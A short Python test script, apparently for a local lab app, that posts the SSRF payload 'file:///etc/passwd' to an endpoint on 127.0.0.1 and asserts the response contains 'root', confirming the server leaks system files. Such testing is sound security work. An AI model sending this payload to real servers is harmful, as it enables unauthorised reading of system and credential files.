import requests 
import pytest

def test_ssrf(url, payload):
    data = {'ssrf': payload}
    #print("[DEBUG] Sending: ", data)
    r = requests.post(url=url, data=data)

    #print(r.text)

    assert "root" in r.text
    assert 200 == r.status_code

def main():
    url = "http://127.0.0.1:5000/api/v1/ssrf"

    test_ssrf(url, "file:///etc/passwd")
    

if __name__ == '__main__':
    main()